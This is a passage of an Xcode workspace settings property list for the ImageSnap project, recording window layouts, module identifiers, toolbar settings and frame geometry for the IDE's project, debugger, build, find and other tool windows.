							</array>
						</dict>
						<key>PBXSmartGroupTreeModuleOutlineStateKey_v7</key>
						<dict>
							<key>PBXSmartGroupTreeModuleOutlineStateExpansionKey</key>
							<array>
								<string>08FB7794FE84155DC02AAC07</string>
								<string>08FB7795FE84155DC02AAC07</string>
								<string>C6859E96029091FE04C91782</string>
								<string>1C37FBAC04509CD000000102</string>
								<string>1C37FABC05509CD000000102</string>
							</array>
							<key>PBXSmartGroupTreeModuleOutlineStateSelectionKey</key>
							<array>
								<array>
									<integer>2</integer>
									<integer>1</integer>
									<integer>0</integer>
								</array>
							</array>
							<key>PBXSmartGroupTreeModuleOutlineStateVisibleRectKey</key>
							<string>{{0, 0}, {186, 504}}</string>
						</dict>
						<key>PBXTopSmartGroupGIDs</key>
						<array/>
						<key>XCIncludePerspectivesSwitch</key>
						<true/>
						<key>XCSharingToken</key>
						<string>com.apple.Xcode.GFSharingToken</string>
					</dict>
					<key>GeometryConfiguration</key>
					<dict>
						<key>Frame</key>
						<string>{{0, 0}, {203, 522}}</string>
						<key>GroupTreeTableConfiguration</key>
						<array>
							<string>SCMStatusColumn</string>
							<real>22</real>
							<string>MainColumn</string>
							<real>164</real>
						</array>
						<key>RubberWindowFrame</key>
						<string>132 315 950 563 0 0 1440 878 </string>
					</dict>
					<key>Module</key>
					<string>PBXSmartGroupTreeModule</string>
					<key>Proportion</key>
					<string>203pt</string>
				</dict>
				<dict>
					<key>Dock</key>
					<array>
						<dict>
							<key>BecomeActive</key>
							<true/>
							<key>ContentConfiguration</key>
							<dict>
								<key>PBXProjectModuleGUID</key>
								<string>1CE0B20306471E060097A5F4</string>
								<key>PBXProjectModuleLabel</key>
								<string>ImageSnap.m</string>
								<key>PBXSplitModuleInNavigatorKey</key>
								<dict>
									<key>Split0</key>
									<dict>
										<key>PBXProjectModuleGUID</key>
										<string>1CE0B20406471E060097A5F4</string>
										<key>PBXProjectModuleLabel</key>
										<string>ImageSnap.m</string>
										<key>_historyCapacity</key>
										<integer>0</integer>
										<key>bookmark</key>
										<string>D4FBB0FC12DED47300E74B2C</string>
										<key>history</key>
										<array>
											<string>D48172E1105D96D400C394D7</string>
											<string>D4AB72991091106400FB6451</string>
											<string>D4FBB0DC12DE696800E74B2C</string>
											<string>D4FBB0DD12DE696800E74B2C</string>
										</array>
									</dict>
									<key>SplitCount</key>
									<string>1</string>
								</dict>
								<key>StatusBarVisibility</key>
								<true/>
							</dict>
							<key>GeometryConfiguration</key>
							<dict>
								<key>Frame</key>
								<string>{{0, 0}, {742, 257}}</string>
								<key>RubberWindowFrame</key>
								<string>132 315 950 563 0 0 1440 878 </string>
							</dict>
							<key>Module</key>
							<string>PBXNavigatorGroup</string>
							<key>Proportion</key>
							<string>257pt</string>
						</dict>
						<dict>
							<key>ContentConfiguration</key>
							<dict>
								<key>PBXProjectModuleGUID</key>
								<string>1CE0B20506471E060097A5F4</string>
								<key>PBXProjectModuleLabel</key>
								<string>Detail</string>
							</dict>
							<key>GeometryConfiguration</key>
							<dict>
								<key>Frame</key>
								<string>{{0, 262}, {742, 260}}</string>
								<key>RubberWindowFrame</key>
								<string>132 315 950 563 0 0 1440 878 </string>
							</dict>
							<key>Module</key>
							<string>XCDetailModule</string>
							<key>Proportion</key>
							<string>260pt</string>
						</dict>
					</array>
					<key>Proportion</key>
					<string>742pt</string>
				</dict>
			</array>
			<key>Name</key>
			<string>Project</string>
			<key>ServiceClasses</key>
			<array>
				<string>XCModuleDock</string>
				<string>PBXSmartGroupTreeModule</string>
				<string>XCModuleDock</string>
				<string>PBXNavigatorGroup</string>
				<string>XCDetailModule</string>
			</array>
			<key>TableOfContents</key>
			<array>
				<string>D4FBB08F12DD7EE300E74B2C</string>
				<string>1CE0B1FE06471DED0097A5F4</string>
				<string>D4FBB09012DD7EE300E74B2C</string>
				<string>1CE0B20306471E060097A5F4</string>
				<string>1CE0B20506471E060097A5F4</string>
			</array>
			<key>ToolbarConfigUserDefaultsMinorVersion</key>
			<string>2</string>
			<key>ToolbarConfiguration</key>
			<string>xcode.toolbar.config.defaultV3</string>
		</dict>
		<dict>
			<key>ControllerClassBaseName</key>
			<string></string>
			<key>IconName</key>
			<string>WindowOfProject</string>
			<key>Identifier</key>
			<string>perspective.morph</string>
			<key>IsVertical</key>
			<integer>0</integer>
			<key>Layout</key>
			<array>
				<dict>
					<key>BecomeActive</key>
					<integer>1</integer>
					<key>ContentConfiguration</key>
					<dict>
						<key>PBXBottomSmartGroupGIDs</key>
						<array>
							<string>1C37FBAC04509CD000000102</string>
							<string>1C37FAAC04509CD000000102</string>
							<string>1C08E77C0454961000C914BD</string>
							<string>1C37FABC05509CD000000102</string>
							<string>1C37FABC05539CD112110102</string>
							<string>E2644B35053B69B200211256</string>
							<string>1C37FABC04509CD000100104</string>
							<string>1CC0EA4004350EF90044410B</string>
							<string>1CC0EA4004350EF90041110B</string>
						</array>
						<key>PBXProjectModuleGUID</key>
						<string>11E0B1FE06471DED0097A5F4</string>
						<key>PBXProjectModuleLabel</key>
						<string>Files</string>
						<key>PBXProjectStructureProvided</key>
						<string>yes</string>
						<key>PBXSmartGroupTreeModuleColumnData</key>
						<dict>
							<key>PBXSmartGroupTreeModuleColumnWidthsKey</key>
							<array>
								<real>186</real>
							</array>
							<key>PBXSmartGroupTreeModuleColumnsKey_v4</key>
							<array>
								<string>MainColumn</string>
							</array>
						</dict>
						<key>PBXSmartGroupTreeModuleOutlineStateKey_v7</key>
						<dict>
							<key>PBXSmartGroupTreeModuleOutlineStateExpansionKey</key>
							<array>
								<string>29B97314FDCFA39411CA2CEA</string>
								<string>1C37FABC05509CD000000102</string>
							</array>
							<key>PBXSmartGroupTreeModuleOutlineStateSelectionKey</key>
							<array>
								<array>
									<integer>0</integer>
								</array>
							</array>
							<key>PBXSmartGroupTreeModuleOutlineStateVisibleRectKey</key>
							<string>{{0, 0}, {186, 337}}</string>
						</dict>
						<key>PBXTopSmartGroupGIDs</key>
						<array/>
						<key>XCIncludePerspectivesSwitch</key>
						<integer>1</integer>
						<key>XCSharingToken</key>
						<string>com.apple.Xcode.GFSharingToken</string>
					</dict>
					<key>GeometryConfiguration</key>
					<dict>
						<key>Frame</key>
						<string>{{0, 0}, {203, 355}}</string>
						<key>GroupTreeTableConfiguration</key>
						<array>
							<string>MainColumn</string>
							<real>186</real>
						</array>
						<key>RubberWindowFrame</key>
						<string>373 269 690 397 0 0 1440 878 </string>
					</dict>
					<key>Module</key>
					<string>PBXSmartGroupTreeModule</string>
					<key>Proportion</key>
					<string>100%</string>
				</dict>
			</array>
			<key>Name</key>
			<string>Morph</string>
			<key>PreferredWidth</key>
			<integer>300</integer>
			<key>ServiceClasses</key>
			<array>
				<string>XCModuleDock</string>
				<string>PBXSmartGroupTreeModule</string>
			</array>
			<key>TableOfContents</key>
			<array>
				<string>11E0B1FE06471DED0097A5F4</string>
			</array>
			<key>ToolbarConfiguration</key>
			<string>xcode.toolbar.config.default.shortV3</string>
		</dict>
	</array>
	<key>PerspectivesBarVisible</key>
	<false/>
	<key>ShelfIsVisible</key>
	<false/>
	<key>SourceDescription</key>
	<string>file at '/Developer/Library/PrivateFrameworks/DevToolsInterface.framework/Resources/XCPerspectivesSpecificationMode1.xcperspec'</string>
	<key>StatusbarIsVisible</key>
	<true/>
	<key>TimeStamp</key>
	<real>0.0</real>
	<key>ToolbarConfigUserDefaultsMinorVersion</key>
	<string>2</string>
	<key>ToolbarDisplayMode</key>
	<integer>1</integer>
	<key>ToolbarIsVisible</key>
	<true/>
	<key>ToolbarSizeMode</key>
	<integer>1</integer>
	<key>Type</key>
	<string>Perspectives</string>
	<key>UpdateMessage</key>
	<string>The Default Workspace in this version of Xcode now includes support to hide and show the detail view (what has been referred to as the "Metro-Morph" feature).  You must discard your current Default Workspace settings and update to the latest Default Workspace in order to gain this feature.  Do you wish to update to the latest Workspace defaults for project '%@'?</string>
	<key>WindowJustification</key>
	<integer>5</integer>
	<key>WindowOrderList</key>
	<array>
		<string>D4FBB0BF12DD81B700E74B2C</string>
		<string>D4FBB0C012DD81B700E74B2C</string>
		<string>1CD10A99069EF8BA00B06720</string>
		<string>D48172A8105D8CB100C394D7</string>
		<string>1C78EAAD065D492600B07095</string>
		<string>/Users/rob/Documents/iHarder_SVN_Checkout/imagesnap/ImageSnap.xcodeproj</string>
	</array>
	<key>WindowString</key>
	<string>132 315 950 563 0 0 1440 878 </string>
	<key>WindowToolsV3</key>
	<array>
		<dict>
			<key>FirstTimeWindowDisplayed</key>
			<false/>
			<key>Identifier</key>
			<string>windowTool.build</string>
			<key>IsVertical</key>
			<true/>
			<key>Layout</key>
			<array>
				<dict>
					<key>Dock</key>
					<array>
						<dict>
							<key>ContentConfiguration</key>
							<dict>
								<key>PBXProjectModuleGUID</key>
								<string>1CD0528F0623707200166675</string>
								<key>PBXProjectModuleLabel</key>
								<string></string>
								<key>StatusBarVisibility</key>
								<true/>
							</dict>
							<key>GeometryConfiguration</key>
							<dict>
								<key>Frame</key>
								<string>{{0, 0}, {500, 218}}</string>
								<key>RubberWindowFrame</key>
								<string>249 332 500 500 0 0 1440 878 </string>
							</dict>
							<key>Module</key>
							<string>PBXNavigatorGroup</string>
							<key>Proportion</key>
							<string>218pt</string>
						</dict>
						<dict>
							<key>ContentConfiguration</key>
							<dict>
								<key>PBXProjectModuleGUID</key>
								<string>XCMainBuildResultsModuleGUID</string>
								<key>PBXProjectModuleLabel</key>
								<string>Build Results</string>
								<key>XCBuildResultsTrigger_Collapse</key>
								<integer>1021</integer>
								<key>XCBuildResultsTrigger_Open</key>
								<integer>1011</integer>
							</dict>
							<key>GeometryConfiguration</key>
							<dict>
								<key>Frame</key>
								<string>{{0, 223}, {500, 236}}</string>
								<key>RubberWindowFrame</key>
								<string>249 332 500 500 0 0 1440 878 </string>
							</dict>
							<key>Module</key>
							<string>PBXBuildResultsModule</string>
							<key>Proportion</key>
							<string>236pt</string>
						</dict>
					</array>
					<key>Proportion</key>
					<string>459pt</string>
				</dict>
			</array>
			<key>Name</key>
			<string>Build Results</string>
			<key>ServiceClasses</key>
			<array>
				<string>PBXBuildResultsModule</string>
			</array>
			<key>StatusbarIsVisible</key>
			<true/>
			<key>TableOfContents</key>
			<array>
				<string>D48172A8105D8CB100C394D7</string>
				<string>D4FBB09112DD7EE300E74B2C</string>
				<string>1CD0528F0623707200166675</string>
				<string>XCMainBuildResultsModuleGUID</string>
			</array>
			<key>ToolbarConfiguration</key>
			<string>xcode.toolbar.config.buildV3</string>
			<key>WindowContentMinSize</key>
			<string>486 300</string>
			<key>WindowString</key>
			<string>249 332 500 500 0 0 1440 878 </string>
			<key>WindowToolGUID</key>
			<string>D48172A8105D8CB100C394D7</string>
			<key>WindowToolIsVisible</key>
			<false/>
		</dict>
		<dict>
			<key>FirstTimeWindowDisplayed</key>
			<false/>
			<key>Identifier</key>
			<string>windowTool.debugger</string>
			<key>IsVertical</key>
			<true/>
			<key>Layout</key>
			<array>
				<dict>
					<key>Dock</key>
					<array>
						<dict>
							<key>ContentConfiguration</key>
							<dict>
								<key>Debugger</key>
								<dict>
									<key>HorizontalSplitView</key>
									<dict>
										<key>_collapsingFrameDimension</key>
										<real>0.0</real>
										<key>_indexOfCollapsedView</key>
										<integer>0</integer>
										<key>_percentageOfCollapsedView</key>
										<real>0.0</real>
										<key>isCollapsed</key>
										<string>yes</string>
										<key>sizes</key>
										<array>
											<string>{{0, 0}, {322, 253}}</string>
											<string>{{322, 0}, {388, 253}}</string>
										</array>
									</dict>
									<key>VerticalSplitView</key>
									<dict>
										<key>_collapsingFrameDimension</key>
										<real>0.0</real>
										<key>_indexOfCollapsedView</key>
										<integer>0</integer>
										<key>_percentageOfCollapsedView</key>
										<real>0.0</real>
										<key>isCollapsed</key>
										<string>yes</string>
										<key>sizes</key>
										<array>
											<string>{{0, 0}, {710, 253}}</string>
											<string>{{0, 253}, {710, 222}}</string>
										</array>
									</dict>
								</dict>
								<key>LauncherConfigVersion</key>
								<string>8</string>
								<key>PBXProjectModuleGUID</key>
								<string>1C162984064C10D400B95A72</string>
								<key>PBXProjectModuleLabel</key>
								<string>Debug - GLUTExamples (Underwater)</string>
							</dict>
							<key>GeometryConfiguration</key>
							<dict>
								<key>DebugConsoleVisible</key>
								<string>None</string>
								<key>DebugConsoleWindowFrame</key>
								<string>{{200, 200}, {500, 300}}</string>
								<key>DebugSTDIOWindowFrame</key>
								<string>{{200, 200}, {500, 300}}</string>
								<key>Frame</key>
								<string>{{0, 0}, {710, 475}}</string>
								<key>PBXDebugSessionStackFrameViewKey</key>
								<dict>
									<key>DebugVariablesTableConfiguration</key>
									<array>
										<string>Name</string>
										<real>120</real>
										<string>Value</string>
										<real>85</real>
										<string>Summary</string>
										<real>158</real>
									</array>
									<key>Frame</key>
									<string>{{322, 0}, {388, 253}}</string>
									<key>RubberWindowFrame</key>
									<string>656 326 710 516 0 0 1440 878 </string>
								</dict>
								<key>RubberWindowFrame</key>
								<string>656 326 710 516 0 0 1440 878 </string>
							</dict>
							<key>Module</key>
							<string>PBXDebugSessionModule</string>
							<key>Proportion</key>
							<string>475pt</string>
						</dict>
					</array>
					<key>Proportion</key>
					<string>475pt</string>
				</dict>
			</array>
			<key>Name</key>
			<string>Debugger</string>
			<key>ServiceClasses</key>
			<array>
				<string>PBXDebugSessionModule</string>
			</array>
			<key>StatusbarIsVisible</key>
			<true/>
			<key>TableOfContents</key>
			<array>
				<string>1CD10A99069EF8BA00B06720</string>
				<string>D4FBB0A712DD810800E74B2C</string>
				<string>1C162984064C10D400B95A72</string>
				<string>D4FBB0A812DD810800E74B2C</string>
				<string>D4FBB0A912DD810800E74B2C</string>
				<string>D4FBB0AA12DD810800E74B2C</string>
				<string>D4FBB0AB12DD810800E74B2C</string>
				<string>D4FBB0AC12DD810800E74B2C</string>
			</array>
			<key>ToolbarConfiguration</key>
			<string>xcode.toolbar.config.debugV3</string>
			<key>WindowString</key>
			<string>656 326 710 516 0 0 1440 878 </string>
			<key>WindowToolGUID</key>
			<string>1CD10A99069EF8BA00B06720</string>
			<key>WindowToolIsVisible</key>
			<false/>
		</dict>
		<dict>
			<key>Identifier</key>
			<string>windowTool.find</string>
			<key>Layout</key>
			<array>
				<dict>
					<key>Dock</key>
					<array>
						<dict>
							<key>Dock</key>
							<array>
								<dict>
									<key>ContentConfiguration</key>
									<dict>
										<key>PBXProjectModuleGUID</key>
										<string>1CDD528C0622207200134675</string>
										<key>PBXProjectModuleLabel</key>
										<string>&lt;No Editor&gt;</string>
										<key>PBXSplitModuleInNavigatorKey</key>
										<dict>
											<key>Split0</key>
											<dict>
												<key>PBXProjectModuleGUID</key>
												<string>1CD0528D0623707200166675</string>
											</dict>
											<key>SplitCount</key>
											<string>1</string>
										</dict>
										<key>StatusBarVisibility</key>
										<integer>1</integer>
									</dict>
									<key>GeometryConfiguration</key>
									<dict>
										<key>Frame</key>
										<string>{{0, 0}, {781, 167}}</string>
										<key>RubberWindowFrame</key>
										<string>62 385 781 470 0 0 1440 878 </string>
									</dict>
									<key>Module</key>
									<string>PBXNavigatorGroup</string>
									<key>Proportion</key>
									<string>781pt</string>
								</dict>
							</array>
							<key>Proportion</key>
							<string>50%</string>
						</dict>
						<dict>
							<key>BecomeActive</key>
							<integer>1</integer>
							<key>ContentConfiguration</key>
							<dict>
								<key>PBXProjectModuleGUID</key>
								<string>1CD0528E0623707200166675</string>
								<key>PBXProjectModuleLabel</key>
								<string>Project Find</string>
							</dict>
							<key>GeometryConfiguration</key>
							<dict>
								<key>Frame</key>
								<string>{{8, 0}, {773, 254}}</string>
								<key>RubberWindowFrame</key>
								<string>62 385 781 470 0 0 1440 878 </string>
							</dict>
							<key>Module</key>
							<string>PBXProjectFindModule</string>
							<key>Proportion</key>
							<string>50%</string>
						</dict>
					</array>
					<key>Proportion</key>
					<string>428pt</string>
				</dict>
			</array>
			<key>Name</key>
			<string>Project Find</string>
			<key>ServiceClasses</key>
			<array>
				<string>PBXProjectFindModule</string>
			</array>
			<key>StatusbarIsVisible</key>
			<integer>1</integer>
			<key>TableOfContents</key>
			<array>
				<string>1C530D57069F1CE1000CFCEE</string>
				<string>1C530D58069F1CE1000CFCEE</string>
				<string>1C530D59069F1CE1000CFCEE</string>
				<string>1CDD528C0622207200134675</string>
				<string>1C530D5A069F1CE1000CFCEE</string>
				<string>1CE0B1FE06471DED0097A5F4</string>
				<string>1CD0528E0623707200166675</string>
			</array>
			<key>WindowString</key>
			<string>62 385 781 470 0 0 1440 878 </string>
			<key>WindowToolGUID</key>
			<string>1C530D57069F1CE1000CFCEE</string>
			<key>WindowToolIsVisible</key>
			<integer>0</integer>
		</dict>
		<dict>
			<key>Identifier</key>
			<string>MENUSEPARATOR</string>
		</dict>
		<dict>
			<key>FirstTimeWindowDisplayed</key>
			<false/>
			<key>Identifier</key>
			<string>windowTool.debuggerConsole</string>
			<key>IsVertical</key>
			<true/>
			<key>Layout</key>
			<array>
				<dict>
					<key>Dock</key>
					<array>
						<dict>
							<key>BecomeActive</key>
							<true/>
							<key>ContentConfiguration</key>
							<dict>
								<key>PBXProjectModuleGUID</key>
								<string>1C78EAAC065D492600B07095</string>
								<key>PBXProjectModuleLabel</key>
								<string>Debugger Console</string>
							</dict>
							<key>GeometryConfiguration</key>
							<dict>
								<key>Frame</key>
								<string>{{0, 0}, {650, 209}}</string>
								<key>RubberWindowFrame</key>
								<string>177 267 650 250 0 0 1440 878 </string>
							</dict>
							<key>Module</key>
							<string>PBXDebugCLIModule</string>
							<key>Proportion</key>
							<string>209pt</string>
						</dict>
					</array>
					<key>Proportion</key>
					<string>209pt</string>
				</dict>
			</array>
			<key>Name</key>
			<string>Debugger Console</string>
			<key>ServiceClasses</key>
			<array>
				<string>PBXDebugCLIModule</string>
			</array>
			<key>StatusbarIsVisible</key>
			<true/>
			<key>TableOfContents</key>
			<array>
				<string>1C78EAAD065D492600B07095</string>
				<string>D4FBB0AD12DD810800E74B2C</string>
				<string>1C78EAAC065D492600B07095</string>
			</array>
			<key>ToolbarConfiguration</key>
			<string>xcode.toolbar.config.consoleV3</string>
			<key>WindowString</key>
			<string>177 267 650 250 0 0 1440 878 </string>
			<key>WindowToolGUID</key>
			<string>1C78EAAD065D492600B07095</string>
			<key>WindowToolIsVisible</key>
			<true/>
		</dict>
		<dict>
			<key>Identifier</key>
			<string>windowTool.snapshots</string>
			<key>Layout</key>
			<array>
				<dict>
					<key>Dock</key>
					<array>
						<dict>
							<key>Module</key>
							<string>XCSnapshotModule</string>
							<key>Proportion</key>
							<string>100%</string>
						</dict>
					</array>
					<key>Proportion</key>
					<string>100%</string>
				</dict>
			</array>
			<key>Name</key>
			<string>Snapshots</string>
			<key>ServiceClasses</key>
			<array>
				<string>XCSnapshotModule</string>
			</array>
			<key>StatusbarIsVisible</key>
			<string>Yes</string>
			<key>ToolbarConfiguration</key>
			<string>xcode.toolbar.config.snapshots</string>
			<key>WindowString</key>
			<string>315 824 300 550 0 0 1440 878 </string>
			<key>WindowToolIsVisible</key>
			<string>Yes</string>
		</dict>
		<dict>
			<key>FirstTimeWindowDisplayed</key>
			<false/>
			<key>Identifier</key>
			<string>windowTool.scm</string>
			<key>IsVertical</key>
			<true/>
			<key>Layout</key>
			<array>
				<dict>
					<key>Dock</key>
					<array>
						<dict>
							<key>ContentConfiguration</key>
							<dict>
								<key>PBXProjectModuleGUID</key>
								<string>1C78EAB2065D492600B07095</string>
								<key>PBXProjectModuleLabel</key>
								<string></string>
								<key>StatusBarVisibility</key>
								<true/>
							</dict>
							<key>GeometryConfiguration</key>
							<dict>
								<key>Frame</key>
								<string>{{0, 0}, {589, 0}}</string>
								<key>RubberWindowFrame</key>
								<string>132 486 589 366 0 0 1440 878 </string>
							</dict>
							<key>Module</key>
							<string>PBXNavigatorGroup</string>
							<key>Proportion</key>
							<string>0pt</string>
						</dict>
						<dict>
							<key>BecomeActive</key>
							<true/>
							<key>ContentConfiguration</key>
							<dict>
								<key>PBXCVSModuleFilterTypeKey</key>
								<integer>1032</integer>
								<key>PBXCVSModuleTreeModuleColumnData</key>
								<dict>
									<key>PBXCVSModuleTreeModuleColumnWidthsKey</key>
									<array>
										<real>200</real>
										<real>56.66162109375</real>
										<real>63</real>
										<real>60</real>
										<real>63</real>
										<real>139.556640625</real>
									</array>
									<key>PBXCVSModuleTreeModuleColumnsKey</key>
									<array>
										<string>Name</string>
										<string>Status</string>
										<string>Update</string>
										<string>Revision</string>
										<string>Author</string>
										<string>Date</string>
									</array>
								</dict>
								<key>PBXProjectModuleGUID</key>
								<string>1CD052920623707200166675</string>
								<key>PBXProjectModuleLabel</key>
								<string>SCM Results</string>
							</dict>
							<key>GeometryConfiguration</key>
							<dict>
								<key>Frame</key>
								<string>{{0, 5}, {589, 320}}</string>
								<key>RubberWindowFrame</key>
								<string>132 486 589 366 0 0 1440 878 </string>
							</dict>
							<key>Module</key>
							<string>PBXCVSModule</string>
							<key>Proportion</key>
							<string>320pt</string>
						</dict>
					</array>
					<key>Proportion</key>
					<string>325pt</string>
				</dict>
			</array>
			<key>Name</key>
			<string>SCM</string>
			<key>ServiceClasses</key>
			<array>
				<string>PBXCVSModule</string>
			</array>
			<key>StatusbarIsVisible</key>
			<true/>
			<key>TableOfContents</key>
			<array>
				<string>D49AA9961085018600FE189B</string>
				<string>D49AA9971085018600FE189B</string>
				<string>1C78EAB2065D492600B07095</string>
				<string>1CD052920623707200166675</string>
			</array>
			<key>ToolbarConfiguration</key>
			<string>xcode.toolbar.config.scm</string>
			<key>WindowString</key>
			<string>132 486 589 366 0 0 1440 878 </string>
			<key>WindowToolGUID</key>
			<string>D49AA9961085018600FE189B</string>
			<key>WindowToolIsVisible</key>
			<false/>
		</dict>
		<dict>
			<key>Identifier</key>
			<string>windowTool.breakpoints</string>
			<key>IsVertical</key>
			<integer>0</integer>
			<key>Layout</key>
			<array>
				<dict>
					<key>Dock</key>
					<array>
						<dict>
							<key>BecomeActive</key>
							<integer>1</integer>
							<key>ContentConfiguration</key>
							<dict>
								<key>PBXBottomSmartGroupGIDs</key>
								<array>
									<string>1C77FABC04509CD000000102</string>
								</array>
								<key>PBXProjectModuleGUID</key>
								<string>1CE0B1FE06471DED0097A5F4</string>
								<key>PBXProjectModuleLabel</key>
								<string>Files</string>
								<key>PBXProjectStructureProvided</key>
								<string>no</string>
								<key>PBXSmartGroupTreeModuleColumnData</key>
								<dict>
									<key>PBXSmartGroupTreeModuleColumnWidthsKey</key>
									<array>
										<real>168</real>
									</array>
									<key>PBXSmartGroupTreeModuleColumnsKey_v4</key>
									<array>
										<string>MainColumn</string>
									</array>
								</dict>
								<key>PBXSmartGroupTreeModuleOutlineStateKey_v7</key>
								<dict>
									<key>PBXSmartGroupTreeModuleOutlineStateExpansionKey</key>
									<array>
										<string>1C77FABC04509CD000000102</string>
									</array>
									<key>PBXSmartGroupTreeModuleOutlineStateSelectionKey</key>
									<array>
										<array>
											<integer>0</integer>
										</array>
									</array>
									<key>PBXSmartGroupTreeModuleOutlineStateVisibleRectKey</key>
									<string>{{0, 0}, {168, 350}}</string>
								</dict>
								<key>PBXTopSmartGroupGIDs</key>
								<array/>
								<key>XCIncludePerspectivesSwitch</key>
								<integer>0</integer>
							</dict>
							<key>GeometryConfiguration</key>
							<dict>
								<key>Frame</key>
								<string>{{0, 0}, {185, 368}}</string>
								<key>GroupTreeTableConfiguration</key>
								<array>
									<string>MainColumn</string>
									<real>168</real>
								</array>
								<key>RubberWindowFrame</key>
								<string>315 424 744 409 0 0 1440 878 </string>
							</dict>
							<key>Module</key>
							<string>PBXSmartGroupTreeModule</string>
							<key>Proportion</key>
							<string>185pt</string>
						</dict>
						<dict>
							<key>ContentConfiguration</key>
							<dict>
								<key>PBXProjectModuleGUID</key>
								<string>1CA1AED706398EBD00589147</string>
								<key>PBXProjectModuleLabel</key>
								<string>Detail</string>
							</dict>
							<key>GeometryConfiguration</key>
							<dict>
								<key>Frame</key>
								<string>{{190, 0}, {554, 368}}</string>
								<key>RubberWindowFrame</key>
								<string>315 424 744 409 0 0 1440 878 </string>
							</dict>
							<key>Module</key>
							<string>XCDetailModule</string>
							<key>Proportion</key>
							<string>554pt</string>
						</dict>
					</array>
					<key>Proportion</key>
					<string>368pt</string>
				</dict>
			</array>
			<key>MajorVersion</key>
			<integer>3</integer>
			<key>MinorVersion</key>
			<integer>0</integer>
			<key>Name</key>
			<string>Breakpoints</string>
			<key>ServiceClasses</key>
			<array>
				<string>PBXSmartGroupTreeModule</string>
				<string>XCDetailModule</string>
			</array>
			<key>StatusbarIsVisible</key>
			<integer>1</integer>
			<key>TableOfContents</key>
			<array>
				<string>1CDDB66807F98D9800BB5817</string>
				<string>1CDDB66907F98D9800BB5817</string>
				<string>1CE0B1FE06471DED0097A5F4</string>
				<string>1CA1AED706398EBD00589147</string>
			</array>
			<key>ToolbarConfiguration</key>
			<string>xcode.toolbar.config.breakpointsV3</string>
			<key>WindowString</key>
			<string>315 424 744 409 0 0 1440 878 </string>
			<key>WindowToolGUID</key>
			<string>1CDDB66807F98D9800BB5817</string>
			<key>WindowToolIsVisible</key>
			<integer>1</integer>
		</dict>
		<dict>
			<key>Identifier</key>
			<string>windowTool.debugAnimator</string>
			<key>Layout</key>
			<array>
				<dict>
					<key>Dock</key>
					<array>
						<dict>
							<key>Module</key>
							<string>PBXNavigatorGroup</string>
							<key>Proportion</key>
							<string>100%</string>
						</dict>
					</array>
					<key>Proportion</key>
					<string>100%</string>
				</dict>
			</array>
			<key>Name</key>
			<string>Debug Visualizer</string>
			<key>ServiceClasses</key>
			<array>
				<string>PBXNavigatorGroup</string>
			</array>
			<key>StatusbarIsVisible</key>
			<integer>1</integer>
			<key>ToolbarConfiguration</key>
			<string>xcode.toolbar.config.debugAnimatorV3</string>
			<key>WindowString</key>
			<string>100 100 700 500 0 0 1280 1002 </string>
		</dict>
		<dict>
			<key>Identifier</key>
			<string>windowTool.bookmarks</string>
			<key>Layout</key>
			<array>
				<dict>
					<key>Dock</key>
					<array>
						<dict>
							<key>Module</key>
							<string>PBXBookmarksModule</string>
							<key>Proportion</key>
							<string>100%</string>
						</dict>
					</array>
					<key>Proportion</key>
					<string>100%</string>
				</dict>
			</array>
			<key>Name</key>
			<string>Bookmarks</string>
			<key>ServiceClasses</key>
			<array>
				<string>PBXBookmarksModule</string>
			</array>
			<key>StatusbarIsVisible</key>
			<integer>0</integer>
			<key>WindowString</key>
			<string>538 42 401 187 0 0 1280 1002 </string>
		</dict>
		<dict>
			<key>Identifier</key>
			<string>windowTool.projectFormatConflicts</string>
			<key>Layout</key>
			<array>
				<dict>
					<key>Dock</key>
					<array>
						<dict>
							<key>Module</key>
							<string>XCProjectFormatConflictsModule</string>
							<key>Proportion</key>
							<string>100%</string>
						</dict>
					</array>
					<key>Proportion</key>
					<string>100%</string>
				</dict>
			</array>
			<key>Name</key>
			<string>Project Format Conflicts</string>
			<key>ServiceClasses</key>
			<array>
				<string>XCProjectFormatConflictsModule</string>
			</array>
			<key>StatusbarIsVisible</key>
			<integer>0</integer>
			<key>WindowContentMinSize</key>
			<string>450 300</string>
			<key>WindowString</key>
			<string>50 850 472 307 0 0 1440 877</string>
		</dict>
		<dict>
			<key>Identifier</key>
			<string>windowTool.classBrowser</string>
			<key>Layout</key>
			<array>
				<dict>
					<key>Dock</key>
					<array>
						<dict>
							<key>BecomeActive</key>
							<integer>1</integer>
							<key>ContentConfiguration</key>
							<dict>
								<key>OptionsSetName</key>
								<string>Hierarchy, all classes</string>
								<key>PBXProjectModuleGUID</key>
								<string>1CA6456E063B45B4001379D8</string>
								<key>PBXProjectModuleLabel</key>
								<string>Class Browser - NSObject</string>
							</dict>
							<key>GeometryConfiguration</key>
							<dict>
								<key>ClassesFrame</key>
								<string>{{0, 0}, {374, 96}}</string>
								<key>ClassesTreeTableConfiguration</key>
								<array>
									<string>PBXClassNameColumnIdentifier</string>
									<real>208</real>
									<string>PBXClassBookColumnIdentifier</string>
									<real>22</real>
								</array>
								<key>Frame</key>
								<string>{{0, 0}, {630, 331}}</string>
								<key>MembersFrame</key>
								<string>{{0, 105}, {374, 395}}</string>
								<key>MembersTreeTableConfiguration</key>
								<array>
									<string>PBXMemberTypeIconColumnIdentifier</string>
									<real>22</real>
									<string>PBXMemberNameColumnIdentifier</string>
									<real>216</real>
									<string>PBXMemberTypeColumnIdentifier</string>
									<real>97</real>
									<string>PBXMemberBookColumnIdentifier</string>
									<real>22</real>
								</array>
								<key>PBXModuleWindowStatusBarHidden2</key>
								<integer>1</integer>
								<key>RubberWindowFrame</key>
								<string>385 179 630 352 0 0 1440 878 </string>
							</dict>
							<key>Module</key>
							<string>PBXClassBrowserModule</string>
							<key>Proportion</key>
							<string>332pt</string>
						</dict>
					</array>
					<key>Proportion</key>
					<string>332pt</string>
				</dict>
			</array>
			<key>Name</key>
			<string>Class Browser</string>
			<key>ServiceClasses</key>
			<array>
				<string>PBXClassBrowserModule</string>
			</array>
			<key>StatusbarIsVisible</key>
			<integer>0</integer>
			<key>TableOfContents</key>
			<array>
				<string>1C0AD2AF069F1E9B00FABCE6</string>
				<string>1C0AD2B0069F1E9B00FABCE6</string>
				<string>1CA6456E063B45B4001379D8</string>
			</array>
			<key>ToolbarConfiguration</key>
			<string>xcode.toolbar.config.classbrowser</string>
			<key>WindowString</key>
			<string>385 179 630 352 0 0 1440 878 </string>
			<key>WindowToolGUID</key>
			<string>1C0AD2AF069F1E9B00FABCE6</string>
			<key>WindowToolIsVisible</key>
			<integer>0</integer>
		</dict>
		<dict>
			<key>Identifier</key>
			<string>windowTool.refactoring</string>
			<key>IncludeInToolsMenu</key>
			<integer>0</integer>
			<key>Layout</key>
			<array>
				<dict>
